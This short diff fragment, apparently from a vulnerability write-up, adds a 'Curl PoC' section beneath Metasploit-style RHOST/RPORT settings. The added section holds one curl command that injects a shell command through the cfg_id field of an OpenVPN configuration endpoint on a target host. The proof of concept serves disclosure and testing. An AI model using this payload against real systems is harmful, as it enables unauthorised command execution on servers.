@@ -36,3 +36,7 @@ set RHOST [IP]
 set RPORT [PORT]
 check
 ```
+### Curl PoC
+```
+curl -X POST -d 'cfg_id=;id;#' http://TARGET/ajax/openvpn/del_ovpncfg.php
+```
